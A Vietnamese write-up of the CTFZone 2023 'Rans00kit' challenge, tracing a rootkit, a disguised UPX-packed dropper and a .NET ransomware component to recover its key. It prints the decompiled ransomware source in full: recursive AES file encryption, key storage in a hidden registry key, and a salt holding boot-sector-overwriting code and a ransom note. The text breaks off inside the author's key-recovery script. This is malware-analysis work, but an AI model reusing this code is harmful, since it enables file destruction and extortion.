# CTFZone 2023 #
{%hackmd @themes/dracula %}
## Rans00kit ##

**Description:**

![](https://hackmd.io/_uploads/B1aRySu22.png)

**Files:**

***Ransookit.ova*** *~4.4GB*

**Solution:**

*Unintended:*

![](https://hackmd.io/_uploads/HyBf8SOnh.png)

![](https://hackmd.io/_uploads/ByaxOHuh3.png)

Giải xong bài này mới phát hiện có unintended cay vc.

*Intended:*

Import ``.ova`` và tiến hành phân tích trực tiếp 

Máy ảo này sử dụng ngôn ngữ là tiếng Nga nên mình khá là khó khăn để phân tích.

![](https://hackmd.io/_uploads/SkuP3ru2n.png)

Dựa vào description, ta phải tìm kiếm ``rootkit``.
Sử dụng công cụ ``PCHunter``, ta có thể dễ dàng tìm ra được ring0 rootkit và vị trí của nó. Ngoài ra cũng có thể dùng công cụ ``kvrt`` để phát hiện.

![](https://hackmd.io/_uploads/rkhZ1IOhh.png)

Sử dụng công cụ ``Autoruns`` ta có thể dễ dàng nhìn thấy ``agony.sys`` nằm trong registry key ``HKLM\SYSTEM\CurrentControlSet\services\agony``.

https://medium.com/redteam-blueteam-series/common-persistence-techniques-registries-lookup-for-blue-team-595612573ed4

![](https://hackmd.io/_uploads/SJN_HLOh3.png)


Trong ``Autoruns``, ngoài ``agony.sys`` ra thì ta có thể thấy ``UpdateService.exe`` trong Task Scheduler. 

![](https://hackmd.io/_uploads/H1dkw0O3n.png)

Task scheduler cũng là 1 nơi trú ẩn của malware phổ biến:

![](https://hackmd.io/_uploads/rkPEvCO32.png)

Mình chạy ``UpdateServce.exe``, sau đó dùng ``procmon`` để xem tiến trình. Tệp thực thi này gọi đến rất nhiều ``.dll``.

![](https://hackmd.io/_uploads/r1OzHJK3h.png)

Sau đó nó tạo tập tin ``UpdateService.bat`` ở ``TEMP``.

![](https://hackmd.io/_uploads/rJ4sVyF2h.png)

Và sau khi kết thúc thì nó xoá đi tập tin này lẫn thư mục chứa nó. Vậy là mình không thể tìm thấy và phân tích tập tin này được nên mình sẽ phân tích trực tiếp ``UpdateService.exe``

![](https://hackmd.io/_uploads/BJzEL1tnh.png)

Do không thể lấy tập tin này theo cách thông thường được nên mình dùng PCHunter để lấy nó ra và phân tích.

![](https://hackmd.io/_uploads/r1oaqCdn2.png)

Mình không thể kéo nó qua flarevm của mình do không đủ quyền để thực hiện và mình không hiểu tiếng Nga để thực hiện set quyền nên mình kéo trực tiếp từ trong ``ova`` ra.

![](https://hackmd.io/_uploads/rkwjPyF3h.png)


Dùng công cụ DIE, ta có thể thấy rằng ``UpdateService.exe`` đã bị packed bằng UPX.

![](https://hackmd.io/_uploads/HyVX-JFnn.png)

Vậy thì unpack thôi. Dùng công cụ ``upx`` với option là ``-d`` để unpack.

![](https://hackmd.io/_uploads/SJEsGkKnn.png)

Dựa vào dòng cuối thì mình có thể đoán rằng file ``exe`` này đã được convert từ ``bat`` sang sử dụng ``b2ecompile``, khi chạy thì nó sẽ tạo ra 1 file ``bat`` là bản sao của chính nó.

https://documentation.help/BAT2EXE/en.html

![](https://hackmd.io/_uploads/S13dmkth3.png)

Vậy thì phân tích nhẹ cái file ``bat`` này nào.

Đầu tiên là nó sẽ chạy với cái title là ``VMWare Update Service``
Sau đó nó sẽ xoá 2 Registries và thêm vào 1 registry
Tiếp theo nó chuyển đến thư mục mà chứa ``rootkit`` ta tìm thấy ban nãy.
Sau đó nó thực hiện chạy ``VGAuthCGI.exe`` , tập tin này sẽ thực hiện 1 vài tác vụ nào đó, bây giờ mình sẽ xem mớ option này thực hiện cái gì.

Okay, đây là ``agony rootkit``, và tập tin này dùng để thực thi nó.

![](https://hackmd.io/_uploads/r1FgjyKhh.png)

Dựa vào đây thì mình có thể nhận định được là nó sẽ ẩn đi ``sys``, ``agony.sys``, ``binary``, ``aliasStore``, ``UpdateService``, ``VGAuthCGI.exe``, ``VGAuth.sys.config``, ``Wow6432Node`` registry key, ``Status`` registry key

Mớ kia thìa mình đã phân tích rồi, bây giờ mình sẽ phân tích ``aliasStore``.

Tập tin này là file thực thi ``.Net``

![](https://hackmd.io/_uploads/BJXKbxYhh.png)

Mình dùng ``dnspy`` để decompile.

Nhìn sơ qua thì chương trình này thực hiện mã hoá tệp tin bằng AES.

![](https://hackmd.io/_uploads/H14WQeKnn.png)

Mình sẽ phân tích hàm ``main`` trước. Đầu tiên thì nó sẽ gen key với độ dài là ``2048``. Sau đó nó tạo subkey như bên dưới và set value cho ``INFO`` là key vừa tạo. Và dựa vào những gì ta phân tích bên trên thì cái key này nó đã bị ẩn nên là không thể truy cập bằng cách thông thường.

```csharp 
private static void Main(string[] args)
{
    string text = DISK_ENCODER.__KEYGEN(2048);
    DISK_ENCODER.GET_REGKEY = Registry.CurrentUser.CreateSubKey("Software\\Wow6432Node\\Microsoft\\Active Setup\\Status");
    DISK_ENCODER.GET_REGKEY.SetValue("INFO", text);
    DISK_ENCODER.GET_REGKEY.Close();
    try
    {
        DISK_ENCODER.ShowWindow(DISK_ENCODER.GetConsoleWindow(), 0);
        DISK_ENCODER.__INIT(Directory.GetCurrentDirectory().ToString(), text);
        Environment.Exit(0);
    }
    catch
    {
        Process.GetCurrentProcess().Kill();
    }
}
```

Tuy nhiên thì mình có PCHunter hehe

![](https://hackmd.io/_uploads/BykQSeF33.png)

Hàm ``INIT`` sẽ thực hiện đệ quy mã hoá các tập tin có trong directory được chỉ định, ở đây là directory hiện tại.

```csharp 
private static void __INIT(string GET_DIRECTORY, string GET_CIPHER_KEY)
{
    try
    {
        GC.Collect();
        foreach (string text in Directory.GetFiles(GET_DIRECTORY))
        {
            try
            {
                DISK_ENCODER.__ENCRYPTION(text, GET_CIPHER_KEY);
            }
            catch
            {
                Thread.Sleep(100);
            }
        }
        foreach (string text2 in Directory.GetDirectories(GET_DIRECTORY))
        {
            try
            {
                DISK_ENCODER.__INIT(text2, GET_CIPHER_KEY);
            }
            catch
            {
                Thread.Sleep(100);
            }
        }
    }
    catch
    {
        Thread.Sleep(100);
    }
}
```

Hàm ``ENCRYPTION`` mã hoá từng tệp tin và thêm ``.config`` ở cuối.

```csharp 
private static void __ENCRYPTION(string GET_INPUT_FILE, string GET_CIPHER_KEY)
{
    try
    {
        DISK_ENCODER.GET_FILE_INFO = new FileInfo(GET_INPUT_FILE);
        byte[] array = File.ReadAllBytes(GET_INPUT_FILE);
        byte[] array2 = Encoding.UTF8.GetBytes(GET_CIPHER_KEY);
        array2 = SHA256.Create().ComputeHash(array2);
        if (DISK_ENCODER.GET_FILE_INFO.Length <= 31457280L)
        {
            byte[] array3 = DISK_ENCODER.__CIPHER(array, array2);
            File.WriteAllBytes(GET_INPUT_FILE, array3);
            File.Move(GET_INPUT_FILE, GET_INPUT_FILE + ".config");
        }
    }
    catch
    {
        Thread.Sleep(100);
    }
}
```

Hàm ``KEYGEN`` tạo ra chuỗi ngẫu nhiên theo key size cho trước.

```csharp 
private static string __KEYGEN(int GET_KEY_SIZE)
{
    int i = 0;
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    while (i < GET_KEY_SIZE--)
    {
        stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!*@$+/)%(&?-="[random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!*@$+/)%(&?-=".Length)]);
    }
    return stringBuilder.ToString();
}
```

Và đây chính là hàm quan trọng nhất của chúng ta:: ``CIPHER``

```csharp 
private static byte[] __CIPHER(byte[] INPUT_HANDLER, byte[] GET_CIPHER_KEY)
{
    byte[] array = null;
    byte[] array2 = new byte[]
    {
        180, 0, 176, 3, 205, 16, 180, 11, 183, 0,
        179, 4, 205, 16, 235, 0, 190, 102, 0, 232,
        60, 0, 190, 185, 0, 232, 54, 0, 190, 2,
        1, 232, 48, 0, 190, 85, 1, 232, 42, 0,
        235, 0, 190, 72, 3, 232, 34, 0, 191, 132,
        3, 180, 0, 205, 22, 180, 14, 60, 13, 116,
        7, 205, 16, 136, 5, 71, 235, 239, 198, 5,
        0, 160, 132, 3, 190, 100, 3, 232, 2, 0,
        235, 216, 180, 14, 183, 0, 179, 7, 138, 4,
        60, 0, 116, 7, 205, 16, 131, 198, 1, 235,
        243, 195, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 10, 13, 0, 32, 32, 32, 32, 32,
        32, 32, 32, 79, 111, 111, 111, 111, 112, 115,
        33, 32, 89, 111, 117, 114, 32, 115, 121, 115,
        116, 101, 109, 32, 104, 97, 118, 101, 32, 98,
        101, 101, 110, 32, 101, 110, 99, 114, 121, 112,
        116, 101, 100, 32, 98, 121, 32, 67, 82, 89,
        76, 73, 78, 69, 32, 82, 65, 78, 83, 79,
        77, 87, 65, 82, 69, 10, 13, 0, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
        45, 45, 45, 45, 45, 45, 45, 45, 10, 13,
        0, 32, 84, 104, 101, 32, 104, 97, 114, 100,
        32, 100, 114, 105, 118, 101, 32, 111, 102, 32,
        121, 111, 117, 114, 32, 99, 111, 109, 112, 117,
        116, 101, 114, 32, 104, 97, 118, 101, 32, 98,
        101, 101, 110, 32, 101, 110, 99, 114, 121, 112,
        116, 101, 100, 32, 119, 105, 116, 104, 32, 97,
        110, 32, 109, 105, 108, 105, 116, 97, 114, 121,
        32, 103, 114, 97, 100, 101, 10, 13, 32, 101,
        110, 99, 114, 121, 112, 116, 105, 111, 110, 32,
        97, 108, 103, 111, 114, 105, 116, 104, 109, 46,
        32, 84, 104, 101, 114, 101, 32, 105, 115, 32,
        110, 111, 32, 119, 97, 121, 32, 116, 111, 32,
        114, 101, 115, 116, 111, 114, 101, 32, 121, 111,
        117, 114, 32, 100, 97, 116, 97, 32, 119, 105,
        116, 104, 111, 117, 116, 32, 97, 32, 115, 112,
        101, 99, 105, 97, 108, 10, 13, 32, 101, 110,
        99, 114, 121, 112, 116, 105, 111, 110, 32, 107,
        101, 121, 33, 32, 89, 111, 117, 32, 99, 97,
        110, 32, 112, 117, 114, 99, 104, 97, 115, 101,
        32, 116, 104, 105, 115, 32, 101, 110, 99, 114,
        121, 112, 116, 105, 111, 110, 32, 107, 101, 121,
        32, 111, 110, 32, 116, 104, 101, 32, 84, 101,
        108, 101, 103, 114, 97, 109, 32, 112, 97, 103,
        101, 10, 13, 32, 115, 104, 111, 119, 110, 32,
        105, 110, 32, 116, 104, 101, 32, 110, 101, 120,
        116, 32, 115, 116, 101, 112, 58, 32, 10, 13,
        32, 10, 13, 32, 32, 32, 49, 46, 32, 83,
        105, 103, 110, 32, 117, 112, 32, 105, 110, 32,
        116, 104, 101, 32, 84, 101, 108, 101, 103, 114,
        97, 109, 32, 97, 116, 32, 34, 104, 116, 116,
        112, 115, 58, 47, 47, 116, 101, 108, 101, 103,
        114, 97, 109, 46, 111, 114, 103, 47, 34, 46,
        32, 73, 116, 32, 115, 111, 32, 101, 97, 115,
        121, 33, 10, 13, 32, 32, 32, 50, 46, 32,
        87, 114, 105, 116, 101, 32, 116, 111, 32, 116,
        104, 101, 32, 117, 115, 101, 114, 32, 64, 68,
        97, 114, 120, 105, 115, 32, 97, 98, 111, 117,
        116, 32, 116, 104, 105, 115, 32, 105, 110, 99,
        105, 100, 101, 110, 116, 10, 13, 32, 32, 32,
        51, 46, 32, 87, 114, 105, 116, 101, 32, 116,
        104, 101, 32, 114, 101, 99, 101, 105, 118, 101,
        100, 32, 101, 110, 99, 114, 121, 112, 116, 105,
        111, 110, 32, 107, 101, 121, 32, 104, 101, 114,
        101, 10, 13, 32, 10, 13, 32, 73, 102, 32,
        121, 111, 117, 32, 97, 108, 114, 101, 97, 100,
        121, 32, 112, 117, 114, 99, 104, 97, 115, 101,
        100, 32, 121, 111, 117, 114, 32, 107, 101, 121,
        44, 32, 112, 108, 101, 97, 115, 101, 32, 101,
        110, 116, 101, 114, 32, 105, 116, 32, 98, 101,
        108, 111, 119, 33, 10, 13, 32, 10, 13, 0,
        32, 69, 110, 116, 101, 114, 32, 116, 104, 101,
        32, 100, 101, 99, 114, 121, 112, 116, 105, 111,
        110, 32, 107, 101, 121, 58, 32, 0, 32, 32,
        61, 62, 32, 69, 114, 114, 111, 114, 33, 32,
        73, 110, 118, 97, 108, 105, 100, 32, 107, 101,
        121, 32, 118, 97, 108, 117, 101, 10, 13, 0,
        32, 205, 16, 235, 0, 190, 201, 105, 118, 101,
        46, 46, 0, 232, 2, 0, 235, 20, 180, 14,
        183, 0, 179, 7, 138, 4, 60, 0, 116, 7,
        205, 16, 131, 198, 1, 235, 243, 195, 181, 0,
        182, 0, 177, 7, 187, 0, 32, 142, 195, 187,
        0, 0, 180, 2, 176, 128, 205, 19, 187, 172,
        232, 190, 0, 0, 38, 1, 52, 38, 192, 36,
        4, 137, 216, 38, 246, 36, 38, 1, 28, 38,
        192, 44, 2, 38, 41, 52, 137, 240, 38, 246,
        36, 38, 1, 20, 38, 208, 36, 70, 131, 254,
        byte.MaxValue, 117, 217, 187, 0, 32, 142, 195, 187, 0,
        0, 180, 3, 176, 128, 205, 19, 254, 193, 128,
        249, 63, 117, 176, 254, 198, 128, 254, 65, 117,
        167, 190, 247, 2, 232, 137, byte.MaxValue, 254, 197, 128,
        253, 5, 117, 152, 235, 0, 187, 0, 128, 142,
        195, 187, 0, 0, 180, 2, 176, 1, 182, 0,
        181, 0, 177, 6, 205, 19, 114, 234, 235, 0,
        187, 0, 128, 142, 195, 187, 0, 0, 180, 3,
        176, 1, 182, 0, 181, 0, 177, 1, 205, 19,
        114, 234, 234, 0, 0, byte.MaxValue, byte.MaxValue, 87, 105, 110,
        100, 111, 119, 115, 32, 104, 97, 115, 32, 101,
        110, 99, 111, 117, 110, 116, 101, 114, 101, 100,
        32, 97, 32, 112, 114, 111, 98, 108, 101, 109,
        32, 99, 111, 109, 109, 117, 110, 105, 99, 97,
        116, 105, 110, 103, 32, 119, 105, 116, 104, 32,
        97, 32, 100, 101, 118, 105, 99, 101, 32, 99,
        111, 110, 110, 101, 99, 116, 101, 100, 32, 116,
        111, 32, 121, 111, 117, 114, 32, 99, 111, 109,
        112, 117, 116, 101, 114, 46, 32, 10, 13, 84,
        104, 105, 115, 32, 101, 114, 114, 111, 114, 32,
        99, 97, 110, 32, 98, 101, 32, 99, 97, 117,
        115, 101, 100, 32, 98, 121, 32, 117, 110, 112,
        108, 117, 103, 103, 105, 110, 103, 32, 97, 32,
        114, 101, 109, 111, 118, 97, 98, 108, 101, 32,
        115, 116, 111, 114, 97, 103, 101, 32, 100, 101,
        118, 105, 99, 101, 32, 115, 117, 99, 104, 32,
        97, 115, 32, 97, 110, 32, 32, 32, 32, 101,
        120, 116, 101, 114, 110, 97, 108, 32, 85, 83,
        66, 32, 100, 114, 105, 118, 101, 32, 119, 104,
        105, 108, 101, 32, 116, 104, 101, 32, 100, 101,
        118, 105, 99, 101, 32, 105, 115, 32, 105, 110,
        32, 117, 115, 101, 44, 32, 111, 114, 32, 98,
        121, 32, 102, 97, 117, 108, 116, 121, 32, 104,
        97, 114, 100, 119, 97, 114, 101, 32, 115, 117,
        99, 104, 32, 97, 115, 32, 97, 32, 32, 104,
        97, 114, 100, 32, 100, 114, 105, 118, 101, 32,
        111, 114, 32, 67, 68, 45, 82, 79, 77, 32,
        100, 114, 105, 118, 101, 32, 116, 104, 97, 116,
        32, 105, 115, 32, 102, 97, 105, 108, 105, 110,
        103, 46, 32, 89, 111, 117, 32, 109, 97, 121,
        32, 99, 97, 110, 99, 101, 108, 32, 116, 104,
        101, 32, 100, 114, 105, 118, 101, 32, 99, 104,
        101, 99, 107, 44, 32, 98, 117, 116, 32, 105,
        116, 32, 105, 115, 32, 115, 116, 114, 111, 110,
        103, 108, 121, 32, 114, 101, 99, 111, 109, 109,
        101, 110, 100, 101, 100, 32, 116, 104, 97, 116,
        32, 121, 111, 117, 32, 99, 111, 110, 116, 105,
        110, 117, 101, 46, 32, 10, 13, 32, 10, 13,
        73, 102, 32, 121, 111, 117, 32, 99, 111, 110,
        116, 105, 110, 117, 101, 32, 116, 111, 32, 114,
        101, 99, 101, 105, 118, 101, 32, 116, 104, 105,
        115, 32, 116, 104, 105, 115, 32, 101, 114, 114,
        111, 114, 32, 109, 101, 115, 115, 97, 103, 101,
        44, 32, 119, 97, 105, 116, 32, 102, 111, 114,
        32, 116, 104, 101, 32, 104, 97, 114, 100, 32,
        100, 114, 105, 118, 101, 32, 32, 32, 32, 32,
        99, 104, 101, 99, 107, 32, 116, 111, 32, 102,
        105, 110, 105, 115, 104, 32, 97, 110, 100, 32,
        99, 111, 110, 116, 97, 99, 116, 32, 116, 104,
        101, 32, 104, 97, 114, 100, 119, 97, 114, 101,
        32, 109, 97, 110, 117, 102, 97, 99, 116, 117,
        114, 101, 114, 46, 10, 13, 32, 10, 13, 87,
        105, 110, 100, 111, 119, 115, 32, 119, 105, 108,
        108, 32, 110, 111, 119, 32, 99, 104, 101, 99,
        107, 32, 116, 104, 101, 32, 100, 114
    };
    using (MemoryStream memoryStream = new MemoryStream())
    {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(GET_CIPHER_KEY, array2, 4096);
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.BlockSize = 128;
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
            rijndaelManaged.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
            {
                cryptoStream.Write(INPUT_HANDLER, 0, INPUT_HANDLER.Length);
                cryptoStream.Close();
            }
            array = memoryStream.ToArray();
        }
    }
    return array;
}
```

Hàm này sử dụng mã hoá AES mode CBC với key là 32-byte và IV là 16-byte.

IV và Key được tạo ra từ key được gen từ hàm keygen, sau đó hash sha256 và cuối cùng là thông qua ``rfc2898`` tạo ra key mới và IV dựa trên key đầu và salt từ ``array2``

```csharp
byte[] array = File.ReadAllBytes(GET_INPUT_FILE);
byte[] array2 = Encoding.UTF8.GetBytes(GET_CIPHER_KEY);
array2 = SHA256.Create().ComputeHash(array2);
```

https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rfc2898derivebytes?view=net-7.0

Ban đầu mình nghĩ cái array2 chỉ là thông báo tống tiền thôi nên là bỏ qua nó :|.

![](https://hackmd.io/_uploads/H1EGFxKh3.png)

Dựa trên script ban đầu thì mình viết 1 script để in ra key và iv

```csharp 
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace ClassLibrary1
{
    public class Class1
    {
        private static void CIPHER(byte[] GET_CIPHER_KEY)
        {
            byte[] array2 = new byte[]
            {
                180, 0, 176, 3, 205, 16, 180, 11, 183, 0,
                179, 4, 205, 16, 235, 0, 190, 102, 0, 232,
                60, 0, 190, 185, 0, 232, 54, 0, 190, 2,
                1, 232, 48, 0, 190, 85, 1, 232, 42, 0,
                235, 0, 190, 72, 3, 232, 34, 0, 191, 132,
                3, 180, 0, 205, 22, 180, 14, 60, 13, 116,
                7, 205, 16, 136, 5, 71, 235, 239, 198, 5,
                0, 160, 132, 3, 190, 100, 3, 232, 2, 0,
                235, 216, 180, 14, 183, 0, 179, 7, 138, 4,
                60, 0, 116, 7, 205, 16, 131, 198, 1, 235,
                243, 195, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 10, 13, 0, 32, 32, 32, 32, 32,
                32, 32, 32, 79, 111, 111, 111, 111, 112, 115,
                33, 32, 89, 111, 117, 114, 32, 115, 121, 115,
                116, 101, 109, 32, 104, 97, 118, 101, 32, 98,
                101, 101, 110, 32, 101, 110, 99, 114, 121, 112,
                116, 101, 100, 32, 98, 121, 32, 67, 82, 89,
                76, 73, 78, 69, 32, 82, 65, 78, 83, 79,
                77, 87, 65, 82, 69, 10, 13, 0, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 45, 45,
                45, 45, 45, 45, 45, 45, 45, 45, 10, 13,
                0, 32, 84, 104, 101, 32, 104, 97, 114, 100,
                32, 100, 114, 105, 118, 101, 32, 111, 102, 32,
                121, 111, 117, 114, 32, 99, 111, 109, 112, 117,
                116, 101, 114, 32, 104, 97, 118, 101, 32, 98,
                101, 101, 110, 32, 101, 110, 99, 114, 121, 112,
                116, 101, 100, 32, 119, 105, 116, 104, 32, 97,
                110, 32, 109, 105, 108, 105, 116, 97, 114, 121,
                32, 103, 114, 97, 100, 101, 10, 13, 32, 101,
                110, 99, 114, 121, 112, 116, 105, 111, 110, 32,
                97, 108, 103, 111, 114, 105, 116, 104, 109, 46,
                32, 84, 104, 101, 114, 101, 32, 105, 115, 32,
                110, 111, 32, 119, 97, 121, 32, 116, 111, 32,
                114, 101, 115, 116, 111, 114, 101, 32, 121, 111,
                117, 114, 32, 100, 97, 116, 97, 32, 119, 105,
                116, 104, 111, 117, 116, 32, 97, 32, 115, 112,
                101, 99, 105, 97, 108, 10, 13, 32, 101, 110,
                99, 114, 121, 112, 116, 105, 111, 110, 32, 107,
                101, 121, 33, 32, 89, 111, 117, 32, 99, 97,
                110, 32, 112, 117, 114, 99, 104, 97, 115, 101,
                32, 116, 104, 105, 115, 32, 101, 110, 99, 114,
                121, 112, 116, 105, 111, 110, 32, 107, 101, 121,
                32, 111, 110, 32, 116, 104, 101, 32, 84, 101,
                108, 101, 103, 114, 97, 109, 32, 112, 97, 103,
                101, 10, 13, 32, 115, 104, 111, 119, 110, 32,
                105, 110, 32, 116, 104, 101, 32, 110, 101, 120,
                116, 32, 115, 116, 101, 112, 58, 32, 10, 13,
                32, 10, 13, 32, 32, 32, 49, 46, 32, 83,
                105, 103, 110, 32, 117, 112, 32, 105, 110, 32,
                116, 104, 101, 32, 84, 101, 108, 101, 103, 114,
                97, 109, 32, 97, 116, 32, 34, 104, 116, 116,
                112, 115, 58, 47, 47, 116, 101, 108, 101, 103,
                114, 97, 109, 46, 111, 114, 103, 47, 34, 46,
                32, 73, 116, 32, 115, 111, 32, 101, 97, 115,
                121, 33, 10, 13, 32, 32, 32, 50, 46, 32,
                87, 114, 105, 116, 101, 32, 116, 111, 32, 116,
                104, 101, 32, 117, 115, 101, 114, 32, 64, 68,
                97, 114, 120, 105, 115, 32, 97, 98, 111, 117,
                116, 32, 116, 104, 105, 115, 32, 105, 110, 99,
                105, 100, 101, 110, 116, 10, 13, 32, 32, 32,
                51, 46, 32, 87, 114, 105, 116, 101, 32, 116,
                104, 101, 32, 114, 101, 99, 101, 105, 118, 101,
                100, 32, 101, 110, 99, 114, 121, 112, 116, 105,
                111, 110, 32, 107, 101, 121, 32, 104, 101, 114,
                101, 10, 13, 32, 10, 13, 32, 73, 102, 32,
                121, 111, 117, 32, 97, 108, 114, 101, 97, 100,
                121, 32, 112, 117, 114, 99, 104, 97, 115, 101,
                100, 32, 121, 111, 117, 114, 32, 107, 101, 121,
                44, 32, 112, 108, 101, 97, 115, 101, 32, 101,
                110, 116, 101, 114, 32, 105, 116, 32, 98, 101,
                108, 111, 119, 33, 10, 13, 32, 10, 13, 0,
                32, 69, 110, 116, 101, 114, 32, 116, 104, 101,
                32, 100, 101, 99, 114, 121, 112, 116, 105, 111,
                110, 32, 107, 101, 121, 58, 32, 0, 32, 32,
                61, 62, 32, 69, 114, 114, 111, 114, 33, 32,
                73, 110, 118, 97, 108, 105, 100, 32, 107, 101,
                121, 32, 118, 97, 108, 117, 101, 10, 13, 0,
                32, 205, 16, 235, 0, 190, 201, 105, 118, 101,
                46, 46, 0, 232, 2, 0, 235, 20, 180, 14,
                183, 0, 179, 7, 138, 4, 60, 0, 116, 7,
                205, 16, 131, 198, 1, 235, 243, 195, 181, 0,
                182, 0, 177, 7, 187, 0, 32, 142, 195, 187,
                0, 0, 180, 2, 176, 128, 205, 19, 187, 172,
                232, 190, 0, 0, 38, 1, 52, 38, 192, 36,
                4, 137, 216, 38, 246, 36, 38, 1, 28, 38,
                192, 44, 2, 38, 41, 52, 137, 240, 38, 246,
                36, 38, 1, 20, 38, 208, 36, 70, 131, 254,
                255, 117, 217, 187, 0, 32, 142, 195, 187, 0,
                0, 180, 3, 176, 128, 205, 19, 254, 193, 128,
                249, 63, 117, 176, 254, 198, 128, 254, 65, 117,
                167, 190, 247, 2, 232, 137, 255, 254, 197, 128,
                253, 5, 117, 152, 235, 0, 187, 0, 128, 142,
                195, 187, 0, 0, 180, 2, 176, 1, 182, 0,
                181, 0, 177, 6, 205, 19, 114, 234, 235, 0,
                187, 0, 128, 142, 195, 187, 0, 0, 180, 3,
                176, 1, 182, 0, 181, 0, 177, 1, 205, 19,
                114, 234, 234, 0, 0, 255, 255, 87, 105, 110,
                100, 111, 119, 115, 32, 104, 97, 115, 32, 101,
                110, 99, 111, 117, 110, 116, 101, 114, 101, 100,
                32, 97, 32, 112, 114, 111, 98, 108, 101, 109,
                32, 99, 111, 109, 109, 117, 110, 105, 99, 97,
                116, 105, 110, 103, 32, 119, 105, 116, 104, 32,
                97, 32, 100, 101, 118, 105, 99, 101, 32, 99,
                111, 110, 110, 101, 99, 116, 101, 100, 32, 116,
                111, 32, 121, 111, 117, 114, 32, 99, 111, 109,
                112, 117, 116, 101, 114, 46, 32, 10, 13, 84,
                104, 105, 115, 32, 101, 114, 114, 111, 114, 32,
                99, 97, 110, 32, 98, 101, 32, 99, 97, 117,
                115, 101, 100, 32, 98, 121, 32, 117, 110, 112,
                108, 117, 103, 103, 105, 110, 103, 32, 97, 32,
                114, 101, 109, 111, 118, 97, 98, 108, 101, 32,
                115, 116, 111, 114, 97, 103, 101, 32, 100, 101,
                118, 105, 99, 101, 32, 115, 117, 99, 104, 32,
                97, 115, 32, 97, 110, 32, 32, 32, 32, 101,
                120, 116, 101, 114, 110, 97, 108, 32, 85, 83,
                66, 32, 100, 114, 105, 118, 101, 32, 119, 104,
                105, 108, 101, 32, 116, 104, 101, 32, 100, 101,
                118, 105, 99, 101, 32, 105, 115, 32, 105, 110,
                32, 117, 115, 101, 44, 32, 111, 114, 32, 98,
                121, 32, 102, 97, 117, 108, 116, 121, 32, 104,
                97, 114, 100, 119, 97, 114, 101, 32, 115, 117,
                99, 104, 32, 97, 115, 32, 97, 32, 32, 104,
                97, 114, 100, 32, 100, 114, 105, 118, 101, 32,
                111, 114, 32, 67, 68, 45, 82, 79, 77, 32,
                100, 114, 105, 118, 101, 32, 116, 104, 97, 116,
                32, 105, 115, 32, 102, 97, 105, 108, 105, 110,
                103, 46, 32, 89, 111, 117, 32, 109, 97, 121,
                32, 99, 97, 110, 99, 101, 108, 32, 116, 104,
                101, 32, 100, 114, 105, 118, 101, 32, 99, 104,
                101, 99, 107, 44, 32, 98, 117, 116, 32, 105,
                116, 32, 105, 115, 32, 115, 116, 114, 111, 110,
                103, 108, 121, 32, 114, 101, 99, 111, 109, 109,
                101, 110, 100, 101, 100, 32, 116, 104, 97, 116,
                32, 121, 111, 117, 32, 99, 111, 110, 116, 105,
                110, 117, 101, 46, 32, 10, 13, 32, 10, 13,
                73, 102, 32, 121, 111, 117, 32, 99, 111, 110,
                116, 105, 110, 117, 101, 32, 116, 111, 32, 114,
                101, 99, 101, 105, 118, 101, 32, 116, 104, 105,
                115, 32, 116, 104, 105, 115, 32, 101, 114, 114,
                111, 114, 32, 109, 101, 115, 115, 97, 103, 101,
                44, 32, 119, 97, 105, 116, 32, 102, 111, 114,
                32, 116, 104, 101, 32, 104, 97, 114, 100, 32,
                100, 114, 105, 118, 101, 32, 32, 32, 32, 32,
                99, 104, 101, 99, 107, 32, 116, 111, 32, 102,
                105, 110, 105, 115, 104, 32, 97, 110, 100, 32,
                99, 111, 110, 116, 97, 99, 116, 32, 116, 104,
                101, 32, 104, 97, 114, 100, 119, 97, 114, 101,
                32, 109, 97, 110, 117, 102, 97, 99, 116, 117,
                114, 101, 114, 46, 10, 13, 32, 10, 13, 87,
                105, 110, 100, 111, 119, 115, 32, 119, 105, 108,
